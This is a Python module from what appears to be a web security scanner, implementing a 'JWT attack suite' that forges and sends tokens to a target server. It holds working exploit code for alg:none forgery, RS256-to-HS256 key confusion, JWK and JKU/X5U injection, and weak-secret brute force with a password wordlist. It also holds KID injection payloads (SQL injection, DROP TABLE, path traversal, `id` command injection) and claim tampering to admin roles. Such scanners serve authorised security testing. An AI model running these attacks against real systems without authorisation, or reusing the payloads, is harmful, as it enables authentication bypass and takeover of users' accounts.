"""C7 – JWT attack suite.

Implements: alg:none, RS256→HS256 key confusion, JWK injection, JKU/X5U
spoofing, KID injection, claim manipulation, brute-force weak secrets,
nested JWT detection, and token refresh flow analysis.
"""

from __future__ import annotations

import asyncio
import base64
import hashlib
import hmac
import json
import time
from datetime import datetime
from typing import Any

import httpx

from app.modules.base_module import BaseModule

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

_DEFAULT_WORDLIST: list[str] = [
    "secret", "password", "123456", "test", "changeme", "supersecret",
    "jwt_secret", "secret_key", "mysecret", "qwerty", "admin",
    "letmein", "abc123", "iloveyou", "welcome", "monkey", "dragon",
    "1234567890", "pass", "master", "root", "toor", "alpine", "password1",
]


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(s: str) -> bytes:
    padding = 4 - len(s) % 4
    if padding != 4:
        s += "=" * padding
    return base64.urlsafe_b64decode(s)


def _parse_jwt(token: str) -> tuple[dict, dict, str] | None:
    """Split and decode a JWT. Returns (header, payload, signature_b64) or None."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload, parts[2]
    except Exception:
        return None


def _build_jwt(header: dict, payload: dict, signature: bytes = b"") -> str:
    """Construct a JWT string from header dict, payload dict, and raw signature bytes."""
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    s = _b64url_encode(signature)
    return f"{h}.{p}.{s}"


def _hs256_sign(header: dict, payload: dict, secret: str) -> str:
    """Sign a JWT with HMAC-SHA256."""
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{_b64url_encode(sig)}"


# ---------------------------------------------------------------------------
# Module
# ---------------------------------------------------------------------------


class JWTSuite(BaseModule):
    """Comprehensive JWT attack suite covering 9 attack categories."""

    name = "jwt_suite"
    description = (
        "Test JWT implementations for: alg:none, RS256→HS256, JWK injection, "
        "JKU/X5U spoofing, KID injection, claim manipulation, weak secret "
        "brute-force, nested JWT, and token refresh flow analysis."
    )
    version = "1.0.0"
    category = "authentication"

    # ------------------------------------------------------------------ #
    # Public entry-point                                                   #
    # ------------------------------------------------------------------ #

    async def run(self, target: str, **kwargs: Any) -> dict[str, Any]:
        """Execute all JWT attacks against *target*.

        Args:
            target: Base URL of the application.
            **kwargs:
                - token (str): A valid JWT to base attacks on.
                - endpoint (str): Path to send test tokens to (default "/api/me").
                - wordlist (List[str]): Secrets for brute-force (default built-in).
                - timeout (int): Request timeout in seconds (default 10).
                - rs256_public_key (str): PEM public key for RS256→HS256 attack.
                - attacker_jwk_url (str): URL to serve attacker-controlled JWK.
        """
        self.started_at = datetime.utcnow()
        base = target if target.startswith("http") else f"https://{target}"
        token: str = kwargs.get("token", "")
        endpoint: str = kwargs.get("endpoint", "/api/me")
        wordlist: list[str] = kwargs.get("wordlist", _DEFAULT_WORDLIST)
        timeout: int = int(kwargs.get("timeout", 10))
        rs256_pub_key: str | None = kwargs.get("rs256_public_key")
        attacker_jwk_url: str | None = kwargs.get("attacker_jwk_url")

        if not token:
            self.add_finding(
                title="No JWT Provided",
                severity="info",
                description="No JWT token was supplied; JWT attack suite skipped.",
                url=base,
            )
            self.completed_at = datetime.utcnow()
            return self.to_dict()

        parsed = _parse_jwt(token)
        if not parsed:
            self.add_finding(
                title="Invalid JWT Format",
                severity="info",
                description="The supplied token is not a valid JWT (expected 3 base64url parts).",
                url=base,
                evidence=token[:100],
            )
            self.completed_at = datetime.utcnow()
            return self.to_dict()

        original_header, original_payload, _ = parsed

        async with httpx.AsyncClient(timeout=timeout, verify=False) as client:
            await asyncio.gather(
                self._attack_alg_none(client, base, endpoint, original_header, original_payload),
                self._attack_rs256_hs256(client, base, endpoint, original_header, original_payload, rs256_pub_key),
                self._attack_jwk_injection(client, base, endpoint, original_header, original_payload),
                self._attack_jku_x5u(client, base, endpoint, original_header, original_payload, attacker_jwk_url),
                self._attack_kid_injection(client, base, endpoint, original_header, original_payload),
                self._attack_claim_manipulation(client, base, endpoint, original_header, original_payload),
                self._bruteforce_secret(client, base, endpoint, original_header, original_payload, wordlist),
                self._detect_nested_jwt(token, base),
                self._analyze_refresh_flow(client, base, timeout),
                return_exceptions=True,
            )

        self.completed_at = datetime.utcnow()
        return self.to_dict()

    # ------------------------------------------------------------------ #
    # Attack 1: alg:none                                                   #
    # ------------------------------------------------------------------ #

    async def _attack_alg_none(
        self,
        client: httpx.AsyncClient,
        base: str,
        endpoint: str,
        header: dict,
        payload: dict,
    ) -> None:
        """Forge a JWT with alg:none and an empty signature."""
        url = base.rstrip("/") + endpoint
        none_variants = ["none", "None", "NONE", "nOnE", "NoNe"]

        for variant in none_variants:
            forged_header = {**header, "alg": variant}
            token = _build_jwt(forged_header, payload)
            try:
                r = await client.get(url, headers={"Authorization": f"Bearer {token}"})
                if r.status_code in (200, 201):
                    self.add_finding(
                        title="JWT Algorithm None Attack – Vulnerable",
                        severity="critical",
                        description=(
                            f"The server accepted a JWT with alg='{variant}' and an "
                            "empty signature. An attacker can forge arbitrary tokens "
                            "without knowing the signing secret."
                        ),
                        evidence=f"alg={variant!r} → HTTP {r.status_code}: {r.text[:200]}",
                        url=url,
                        owasp_category="A07",
                        cwe="CWE-287",
                        forged_token=token,
                    )
                    return  # One finding is enough
            except Exception as exc:
                self.logger.debug("alg:none variant %s error: %s", variant, exc)

    # ------------------------------------------------------------------ #
    # Attack 2: RS256 → HS256 key confusion                               #
    # ------------------------------------------------------------------ #

    async def _attack_rs256_hs256(
        self,
        client: httpx.AsyncClient,
        base: str,
        endpoint: str,
        header: dict,
        payload: dict,
        public_key_pem: str | None,
    ) -> None:
        """Use the RSA public key as the HMAC secret (algorithm confusion)."""
        if not public_key_pem:
            self.logger.debug("RS256→HS256: no public key provided; skipping")
            return

        url = base.rstrip("/") + endpoint
        confused_header = {**header, "alg": "HS256"}
        # Sign with the public key as the HMAC secret
        token = _hs256_sign(confused_header, payload, public_key_pem)
        try:
            r = await client.get(url, headers={"Authorization": f"Bearer {token}"})
            if r.status_code in (200, 201):
                self.add_finding(
                    title="JWT RS256→HS256 Algorithm Confusion Attack – Vulnerable",
                    severity="critical",
                    description=(
                        "The server accepted an HS256 JWT signed with the RSA public "
                        "key as the HMAC secret (CVE-2015-9235 class). An attacker who "
                        "obtains the public key (often public) can forge arbitrary tokens."
                    ),
                    evidence=f"HTTP {r.status_code}: {r.text[:200]}",
                    url=url,
                    owasp_category="A07",
                    cwe="CWE-287",
                )
        except Exception as exc:
            self.logger.debug("RS256→HS256 error: %s", exc)

    # ------------------------------------------------------------------ #
    # Attack 3: JWK header injection                                       #
    # ------------------------------------------------------------------ #

    async def _attack_jwk_injection(
        self,
        client: httpx.AsyncClient,
        base: str,
        endpoint: str,
        header: dict,
        payload: dict,
    ) -> None:
        """Embed an attacker-controlled JWK directly in the JWT header."""
        try:
            import cryptography.hazmat.primitives.asymmetric.padding as _pad  # type: ignore
            from cryptography.hazmat.backends import default_backend  # type: ignore
            from cryptography.hazmat.primitives import hashes as _hashes  # type: ignore
            from cryptography.hazmat.primitives.asymmetric import rsa  # type: ignore

            private_key = rsa.generate_private_key(
                public_exponent=65537, key_size=2048, backend=default_backend()
            )
            pub_key = private_key.public_key()
            pub_nums = pub_key.public_key().public_numbers() if hasattr(pub_key, "public_key") else pub_key.public_numbers()

            def _int_to_b64(n: int) -> str:
                length = (n.bit_length() + 7) // 8
                return _b64url_encode(n.to_bytes(length, "big"))

            embedded_jwk = {
                "kty": "RSA",
                "n": _int_to_b64(pub_nums.n),
                "e": _int_to_b64(pub_nums.e),
            }
            injected_header = {**header, "alg": "RS256", "jwk": embedded_jwk}
            h_enc = _b64url_encode(json.dumps(injected_header, separators=(",", ":")).encode())
            p_enc = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
            signing_input = f"{h_enc}.{p_enc}".encode()
            sig = private_key.sign(signing_input, _pad.PKCS1v15(), _hashes.SHA256())
            token = f"{h_enc}.{p_enc}.{_b64url_encode(sig)}"

            url = base.rstrip("/") + endpoint
            r = await client.get(url, headers={"Authorization": f"Bearer {token}"})
            if r.status_code in (200, 201):
                self.add_finding(
                    title="JWT JWK Header Injection – Vulnerable",
                    severity="critical",
                    description=(
                        "The server accepted a JWT that embedded an attacker-controlled "
                        "RSA public key in the 'jwk' header parameter and used it to "
                        "verify the signature. This allows full token forgery."
                    ),
                    evidence=f"HTTP {r.status_code}: {r.text[:200]}",
                    url=url,
                    owasp_category="A07",
                    cwe="CWE-347",
                )
        except ImportError:
            self.logger.debug("cryptography library not available; JWK injection skipped")
        except Exception as exc:
            self.logger.debug("JWK injection error: %s", exc)

    # ------------------------------------------------------------------ #
    # Attack 4: JKU / X5U URL spoofing                                    #
    # ------------------------------------------------------------------ #

    async def _attack_jku_x5u(
        self,
        client: httpx.AsyncClient,
        base: str,
        endpoint: str,
        header: dict,
        payload: dict,
        attacker_jwk_url: str | None,
    ) -> None:
        """Forge a JWT with jku/x5u pointing to an attacker-controlled key set."""
        if not attacker_jwk_url:
            self.logger.debug("JKU/X5U: no attacker_jwk_url provided; skipping")
            return

        url = base.rstrip("/") + endpoint
        for param in ("jku", "x5u"):
            forged_header = {**header, param: attacker_jwk_url}
            token = _build_jwt(forged_header, payload)
            try:
                r = await client.get(url, headers={"Authorization": f"Bearer {token}"})
                if r.status_code in (200, 201):
                    self.add_finding(
                        title=f"JWT {param.upper()} URL Spoofing – Vulnerable",
                        severity="critical",
                        description=(
                            f"The server fetched keys from an attacker-controlled URL "
                            f"supplied in the '{param}' header parameter and accepted "
                            "the resulting token, enabling full token forgery."
                        ),
                        evidence=f"Header {param}={attacker_jwk_url} → HTTP {r.status_code}",
                        url=url,
                        owasp_category="A07",
                        cwe="CWE-918",
                    )
            except Exception as exc:
                self.logger.debug("JKU/X5U %s error: %s", param, exc)

    # ------------------------------------------------------------------ #
    # Attack 5: KID injection                                             #
    # ------------------------------------------------------------------ #

    async def _attack_kid_injection(
        self,
        client: httpx.AsyncClient,
        base: str,
        endpoint: str,
        header: dict,
        payload: dict,
    ) -> None:
        """Inject SQL, path traversal, and command injection via the 'kid' header."""
        url = base.rstrip("/") + endpoint
        kid_payloads: list[dict[str, Any]] = [
            # SQL injection: make the DB return a known value as the key
            {"kid": "' UNION SELECT 'attacker_key'--", "secret": "attacker_key"},
            {"kid": "1; DROP TABLE keys--", "secret": "secret"},
            # Path traversal: use /dev/null (key = empty string → empty HMAC)
            {"kid": "../../dev/null", "secret": ""},
            {"kid": "../../../dev/null", "secret": ""},
            # Command injection
            {"kid": "`id`", "secret": "secret"},
            {"kid": "$(id)", "secret": "secret"},
        ]
        for entry in kid_payloads:
            kid_val = entry["kid"]
            secret = entry["secret"]
            injected_header = {**header, "alg": "HS256", "kid": kid_val}
            token = _hs256_sign(injected_header, payload, secret)
            try:
                r = await client.get(url, headers={"Authorization": f"Bearer {token}"})
                if r.status_code in (200, 201):
                    self.add_finding(
                        title="JWT KID Injection – Vulnerable",
                        severity="critical",
                        description=(
                            f"The server accepted a JWT whose 'kid' header was set to "
                            f"{kid_val!r}. This indicates the kid value is used in a "
                            "database query or file path without sanitisation, enabling "
                            "SQL injection, path traversal, or command injection."
                        ),
                        evidence=f"kid={kid_val!r} → HTTP {r.status_code}",
                        url=url,
                        owasp_category="A03",
                        cwe="CWE-89",
                    )
                    break
            except Exception as exc:
                self.logger.debug("KID injection error: %s", exc)

    # ------------------------------------------------------------------ #
    # Attack 6: Claim manipulation                                         #
    # ------------------------------------------------------------------ #

    async def _attack_claim_manipulation(
        self,
        client: httpx.AsyncClient,
        base: str,
        endpoint: str,
        header: dict,
        payload: dict,
    ) -> None:
        """Manipulate standard claims to escalate privileges or bypass expiry."""
        url = base.rstrip("/") + endpoint
        now = int(time.time())

        manipulations: list[tuple[str, dict]] = [
            ("exp=far future", {**payload, "exp": now + 9_999_999}),
            ("exp=0 (epoch)", {**payload, "exp": 0}),
            ("role=admin", {**payload, "role": "admin", "is_admin": True}),
            ("sub=1 (first user)", {**payload, "sub": "1"}),
            ("sub=admin", {**payload, "sub": "admin"}),
            ("aud=removed", {k: v for k, v in payload.items() if k != "aud"}),
            ("iss=attacker", {**payload, "iss": "https://attacker.example.com"}),
            ("iat=0", {**payload, "iat": 0}),
        ]

        for label, manipulated_payload in manipulations:
            # Use the original algorithm; try an unsigned variant too
            token_none = _build_jwt({**header, "alg": "none"}, manipulated_payload)
            try:
                r = await client.get(
                    url, headers={"Authorization": f"Bearer {token_none}"}
                )
                if r.status_code in (200, 201):
                    self.add_finding(
                        title=f"JWT Claim Manipulation – {label} (alg:none)",
                        severity="critical",
                        description=(
                            f"The server accepted a JWT with manipulated claim '{label}' "
                            "and alg:none, indicating both claim validation and algorithm "
                            "enforcement are absent."
                        ),
                        evidence=f"Manipulation: {label} → HTTP {r.status_code}",
                        url=url,
                        owasp_category="A07",
                        cwe="CWE-287",
                    )
            except Exception as exc:
                self.logger.debug("Claim manipulation %s error: %s", label, exc)

    # ------------------------------------------------------------------ #
    # Attack 7: Brute-force weak secrets                                   #
    # ------------------------------------------------------------------ #

    async def _bruteforce_secret(
        self,
        client: httpx.AsyncClient,
        base: str,
        endpoint: str,
        header: dict,
        payload: dict,
        wordlist: list[str],
    ) -> None:
        """Attempt HMAC-SHA256 signing with candidate secrets and test acceptance."""
        if header.get("alg", "").upper() not in ("HS256", "HS384", "HS512"):
            self.logger.debug("JWT brute-force: algorithm is not HMAC; skipping")
            return

        url = base.rstrip("/") + endpoint
        for secret in wordlist:
            token = _hs256_sign({**header, "alg": "HS256"}, payload, secret)
            try:
                r = await client.get(url, headers={"Authorization": f"Bearer {token}"})
                if r.status_code in (200, 201):
                    self.add_finding(
                        title="JWT Weak Secret Discovered",
                        severity="critical",
                        description=(
                            f"The JWT signing secret was found by brute-force: '{secret}'. "
                            "Anyone who knows this secret can forge arbitrary tokens."
                        ),
                        evidence=f"Secret='{secret}' → HTTP {r.status_code}",
                        url=url,
                        owasp_category="A02",
                        cwe="CWE-327",
                        discovered_secret=secret,
                    )
                    return
            except Exception as exc:
                self.logger.debug("Brute-force %r error: %s", secret, exc)

    # ------------------------------------------------------------------ #
    # Attack 8: Nested JWT detection                                      #
    # ------------------------------------------------------------------ #

    async def _detect_nested_jwt(self, token: str, base: str) -> None:
        """Detect JWE or nested JWT (JWT inside JWT) which can bypass validation."""
        # A JWE has 5 dot-separated parts
        if token.count(".") == 4:
            self.add_finding(
                title="Nested JWT (JWE) Detected",
                severity="medium",
                description=(
                    "The supplied token appears to be a JWE (JSON Web Encryption) or "
                    "nested JWT (5-part structure). Nested JWTs have historically been "
                    "exploited to bypass outer validation in some libraries."
                ),
                evidence=f"Token has {token.count('.') + 1} parts",
                url=base,
                owasp_category="A02",
            )
            return

        parsed = _parse_jwt(token)
        if parsed:
            _, payload, _ = parsed
            # Check if any claim value looks like a JWT
            for claim, value in payload.items():
                if isinstance(value, str) and value.count(".") == 2:
                    inner = _parse_jwt(value)
                    if inner:
                        self.add_finding(
                            title=f"Nested JWT Found in Claim '{claim}'",
                            severity="medium",
                            description=(
                                f"The JWT payload contains a nested JWT in the '{claim}' "
                                "claim. Nested JWT processing logic in some frameworks "
                                "can be confused into trusting the inner token's claims."
                            ),
                            evidence=f"Claim '{claim}' contains a JWT: {value[:80]}",
                            url=base,
                        )

    # ------------------------------------------------------------------ #
    # Attack 9: Token refresh flow analysis                               #
    # ------------------------------------------------------------------ #

    async def _analyze_refresh_flow(
        self,
        client: httpx.AsyncClient,
        base: str,
        timeout: int,
    ) -> None:
        """Probe common refresh token endpoints for security misconfigurations."""
        refresh_paths = [
            "/auth/refresh",
            "/api/auth/refresh",
            "/token/refresh",
            "/refresh_token",
            "/oauth/token",
            "/api/token/refresh",
        ]
        for path in refresh_paths:
            url = base.rstrip("/") + path
            try:
                # Test 1: Empty refresh token
                r1 = await client.post(
                    url,
                    json={"refresh_token": ""},
                    headers={"Content-Type": "application/json"},
                )
                if r1.status_code == 200:
                    self.add_finding(
                        title="Token Refresh Accepts Empty Token",
                        severity="high",
                        description=(
                            f"The refresh endpoint {url} returned HTTP 200 for an empty "
                            "refresh_token value. This may allow session fixation or "
                            "token generation without valid credentials."
                        ),
                        evidence=f"Empty token → {r1.status_code}: {r1.text[:200]}",
                        url=url,
                        owasp_category="A07",
                    )

                # Test 2: Expired JWT as refresh token
                expired_payload = {"exp": 1, "iat": 1, "sub": "1"}
                expired_token = _build_jwt({"alg": "none"}, expired_payload)
                r2 = await client.post(
                    url,
                    json={"refresh_token": expired_token},
                    headers={"Content-Type": "application/json"},
                )
                if r2.status_code == 200:
                    self.add_finding(
                        title="Token Refresh Accepts Expired JWT",
                        severity="high",
                        description=(
                            f"The refresh endpoint {url} accepted an obviously expired "
                            "JWT (exp=1, epoch 1970) as a valid refresh token."
                        ),
                        evidence=f"Expired token → {r2.status_code}: {r2.text[:200]}",
                        url=url,
                        owasp_category="A07",
                    )

            except Exception as exc:
                self.logger.debug("Refresh flow probe %s error: %s", url, exc)
